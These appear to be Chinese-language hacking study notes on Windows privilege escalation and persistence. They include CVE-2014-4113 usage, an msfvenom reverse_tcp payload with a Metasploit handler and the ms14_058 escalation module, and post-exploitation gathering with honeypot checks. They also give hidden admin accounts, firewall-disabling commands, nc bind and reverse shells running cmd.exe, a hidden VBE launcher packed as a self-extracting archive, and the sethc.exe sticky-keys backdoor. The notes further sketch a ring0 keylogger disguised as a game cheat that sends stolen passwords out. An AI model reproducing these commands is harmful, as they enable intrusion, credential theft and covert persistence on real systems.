权限机制详解与提权操作权限维持

操作系统提权

权限机制

系统权限

windows：

  • administrator账户默认禁用，这会导致很多功能不可用，人类可用最高权限，在管理中可看到用户与用户组设置

  • system 机器可用最高权限，任务管理器中system进程通过逆向找到漏洞，可直接提权至system

  • others权限

Linux：

  • root 用户和机器可用最高权限

  • others权限，比如www，mysql这些服务，每一个服务都有专门的用户，对应不同的用户权限

  • cat /etc/passwd查看

  • whoami

硬件权限

得到一个系统之后一般是尽可能去提高权限，其实每一个硬件也有权限

CPU：

对于中介的OS，硬件比如cpu不会把所有权限都给操作系统，

ring0权限：驱动程序的权限

ring3权限：大多数软件运行在权限

如何操控ring0权限，windows ddk编程，驱动层面，C++写键盘的钩子，直接把密码勾出来，比如QQ光标闪烁，使用ring3级别软件监听输入信息是搞不定的，会有扰乱码，此时可以尝试用ring0级别的驱动程序来记录键盘键位。

理念：外挂伪装，可以自动把杀毒软件关闭，调用外挂时QQ过段时间会被打掉线，重新登录时ring0开始监听密码，然后使用邮箱（比如使用抓包抓到之后也会用邮箱（盒子邮箱：https://www.boxmail.cn 可能有关））或者用post请求提交到自己搭建的php网站上

调用ring0权限的病毒可以直接破坏硬盘

u盘usb硬件木马

usb接口（五角大楼入侵，仿造U盘调包）

驱动程序，u盘刚插上的瞬间，调用ring0级别

U盘改造，上面搭载存储模块，wifi模块，接口供电之后打开wifi，相当于一个微型电脑，上面可以搭载一个小网站。可以调用cmd，powershell（可以命令行下载），u盘可以被远程编程和执行

硬件编程（有时候软件需要拼技术，但是硬件一般用来打击顽固目标）

漏洞提权

CVE-2014-4113 提权漏洞

CVE-2014-4113 漏洞（中国的叫CNNVE，自己找漏洞发CVE上去含金量很高），工具

win10测试该工具火绒隔离，执行win64报错[281] failed 00000000 执行win32报错[183] failed 0000007E，估计是漏洞挂掉了。

win7 ver 6.3.7601测试win64 whoami 返回系统system，提权成功

直接把net user yonghuming mima /add命令放在win64.exe后面会因为太长导致解析失败，win64.exe a.bat 将命令写入bat文件，用系统权限执行a.bat文件，执行成功。（如果文件后缀名错误为a.bat.txt会导致 返回[691] failed 00000002，换回管理员用户使用win64执行a.bat仍然报错）

CVE-2014-6332 IE漏洞

该漏洞从win98就早有了，诱导用IE打开，可以做一个假的页面

漏洞利用的前提：使用IE、未打漏洞的、未开360的；用IE打开该页面后，电脑将会新建一个admin的用户，密码也是admin,并将IP发给自己的服务器；创建隐藏帐号请参考http://www.vfocus.net/art/20090420/4976.html

将a.html放在自己网站上，用自己电脑IE访问网站，IE弹出运行脚本弹窗警告。（此时查看网页的权限如果是管理员权限，则脚本中创建用户的功能可以运行）此时net user多了个admin用户，每次刷新网页都会出来admin（即使删掉）

1nalb2.html是直接打开cmd

使用msf木马提权

msfvenom -a x86 -platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.43.200 LPORT=4444 -e(encode) x86/shikata_ga_nai -f exe > msf.exe

将在root中生产的木马传到目标上，执行，上线，同前一天基本操作

msfconsole，use exploit/multi/handler, set payload windows/meterpreter/reverse_tcp,show options, set LHOST [ip], set LPORT 4444, exploit(开始监听)，上线后，background，sessions（merterpreter help查看）

back

use exploit/windows/local/ms14_058

show options,set session 1（刚刚控制的木马background的session）,exploit，如果成功会返回一个新的session号，登录新的id使用getuid，getsystem即可

这里使用ms14_058…（tab键补全）ms14_058,ms16_016目标一般是x32位系统，有必要知道local中各个工具是怎么来用的

MSF提权后对目标信息的采集

提权之后，先别着急拿东西

需要进入一个session（之前布置的木马）

forensics

run post/windows/gather/forensics/xxxx 取证模块

browser_history

run post/windows/gather/forensics/browser_history 收集各个浏览器历史

火狐使用sqlite查看，https://blog.csdn.net/weixin_41489908/article/details/107072458 SELECT url FROM moz_places

查看方式google一下

enum_drives

run post/windows/gather/forensics/enum_drives 判断磁盘大小，物理磁盘drive0是一块物理磁盘总大小，看是否是正常的电脑大小，据此判断是不是蜜罐，普通人都会有好几个盘。

蜜罐专门会暴露一些菜鸟黑客都会入侵的漏洞，连接蜜罐时也在追踪你，要跑赶紧跑。

checkvm

run post/windows/gather/checkvm 检测是否是虚拟机，防止蜜罐，现在虚拟化技术成熟，用虚拟机其实也正常，但万事小心。

enum_services

run post/windows/gather/enum_services 获取开启服务信息，根据服务知道这台电脑大概是用来干嘛的。有必要的话甚至可以插入或替换服务文件，或者捆绑什么东西

enum_applications

run post/windows/gather/enum_applications 查看安装应用情况，通过应用知道对方经常在干嘛。有时候有的木马需要VC++2008等类似的运行库，有些时候缺少这些donate framework木马会报错，从而暴露

run post/windows/gather/enum_shares 查看共享（没啥好看的）

dumplinks

run post/windows/gather/dumplinks 查看最近操作或安装的东西，判断这台电脑最近有没有人用，有的电脑上office文档特别多，需要找最近操作的，蜜罐的话这里的recent一般是没有的，蜜罐装好之后大概率是不会去使用的。

enum_patches

run post/windows/gather/enum_patches查看用户安装了哪些补丁。 这里用cmd的systeminfo可以看，但所有的系统命令都在windows system32的文件夹里，如果把系统命令删了也可以用enum_patches来查看，

通过以上信息基本确定目标是不是蜜罐

cd /usr/share/metasploit-framework/scripts/resource

kali里大佬写的脚本/usr/share/metasploit-framework/scripts/meterpreter

本质上之前的命令都是通过这些用Ruby这个面向对象脚本语言写的rb脚本来实现的

tools文件夹下大佬写的很多工具，payload攻击载荷等

/usr/share/metasploit-framework/data/exploits中就有很多漏洞，有很多大佬写的漏洞利用程序拿来学习学习

run scraper

导出所有信息

包括注册表（win神经系统）

run winenum

搜集系统环境变量

这两条命令纯属娱乐，getuid，getsystem，替你敲一些传统的命令，把返回结果放在指定目录下

you-get

数据包捕获

（不同于抓包）

捕获一些流媒体，视频，声音很难搞。

比较出名的有一个叫you-get，直接读取视频流这个流量，一些网站不会轻易直接让你下载

官网安装python 3.7以上解释器环境，安装python会附带安装好pip

pip install -i(通过指定源安装) https://pypi.doubanio.com/simple you-get 这个库

（https://github.com/soimort/you-get）

you-get -i 视频链接

抖音抄袭的instagram，一个10w粉丝（得看什么粉）一般可以卖大几千，一万（对于专门做号的人来说10w粉丝只需要一周时间）

视频vip接口，通过流转发操作接口，只需要用一个账号就可以通用vip

权限维持——后门

win后门

畸形文件夹

第一种，点点文件夹

​ 不同具体版本，呈现方式不同
​ mkdir xxx..\ 删不掉
​ eg1
​ 此时鼠标移动图片到xxx..\中，自动跳出xxx文件夹
​ 打开两个文件夹，里面都为空
​ 此时右键删除xxx文件夹，图片自动在xxx..中出现
​ xxx..中的图片可以删，文件夹本身不能删
​ eg2
​ 鼠标移动图片到xxx..中，自动跳出xxx文件夹
​ 此时删掉xxx.. 刷新后，未删除的xxx变为了xxx.. 同时图片转移到其中
​ 总之，xxx..文件夹本身用鼠标方式无法删除

删除方式 不能用rmdir，要用rd xxx..\
第二种，空格文件夹

​ md “\test\ " 鼠标删不掉，里面有两层无文件名的文件夹
​ 鼠标移个图片进test上，里面第一层图片可访问，第二层不可访问，两层图片同出现同消失

​ 删除方式 rd /s /q “c:\test”

第三种，点点点文件夹

​ md c:...
​ 点进去，发现里外两个世界相同，再点进去，才是空的
​ 此时从外世界移动图片到…文件夹中，发现在里世界没有图片，在里世界的…文件夹中
​ 此时这个里世界的…中的图片无法删除
​ 删除方式 rmdir /s /q ...\

添加用户，提权

​ net user 查看当前电脑的用户，或者计算机管理-本地用户和组中查看
​ net user zj 123 /add 添加用户zj
​ net user zj /del 删除用户zj
​ net localgroup administrators zj /add 提权
​ net localgroup users zj /del 离组，血统纯正
​ 现在有win多使用命令行管理（抄linux），管理员会去检查有没有人使用net user命令
​ net user zj1$ 123 /add 创建隐藏用户，net user看不到，这种带$符号的反而在图形化界面看到

共享

​ 磁盘，右键属性，不共享，在命令行中才能看到是否真正共享
​ net share 查看共享
​ net share c$ /del 删除该共享
​ 如果知道账户名和密码，在资源管理器中，映射网络驱动器(同一个内网中)
​ 文件夹\192.168.1.49\c$ 系统里net share默认共享名是c$，都加$

net view 查看当前局域网的共享情况 （当前局域网中开共享的主机名，如果再知道账户密码和共享盘即可映射）
net share wocao=c:/ 创建共享
net share wocao /del 删除共享

防火墙

​ 关闭防火墙
​ netsh advfirewall set allprofiles state off
​ 查看防火墙状态
​ netsh advfirewall show allprofiles
​ 关闭防火墙服务
​ net stop mpssvc

-------------
关闭防火墙会触发报警，单独开启某个端口

配合木马连入
目标
netsh advfirewall firewall add rule name="nc bind shell" dir=in action=allow protocol=TCP localport=8088
nc -lvp 8088 -e cmd.exe
黑客
nc -nv [目标ip] 8088
--------
配合木马连出(反弹)
目标
netsh advirewall firewall add rule name="nc reverse shell" dir=out action=allow protocol=TCP localport=8088
nc -nv [黑客ip] 8088 -e cmd.exe

黑客
nc -lvp 8088
---------
不会做木马免杀(加密软件加密)的话，win10还需要通过注册表关闭defender

消除黑框

​ b.vbe (vbs一样) (实战使用python或者go做，写到系统启动服务里面)
​ set ws=createobject(“wscript.shell”)
​ do
​ ws.run “c:\a.bat”,0 立即执行a.bat(里面批量写入上面一些操作，增加用户，共享，木马，注入进程服务，开启某端口，修改注册表关闭defender)
​ wscript.sleep 9000 毫秒
​ loop

把该vbe文件右键压缩，winrar(双击自解压)创建自解压文件，高级，自解压选项，解压路径，解压后运行vbe，模式，隐藏全部，文本图标等

shift后门(远程登录时用到)

​ takeown /f c:\windows\system32\sethc.* /a /r /d y 获得所有权，把凡是sethc开头的文件
​ cacls c:\windows\system32\sethc.exe /T /E /G system:F 修改熟悉
​ cacls c:\windows\system32\sethc.exe /T /E /G administrator:F F把权限强行给
​ copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe /y y强行替换
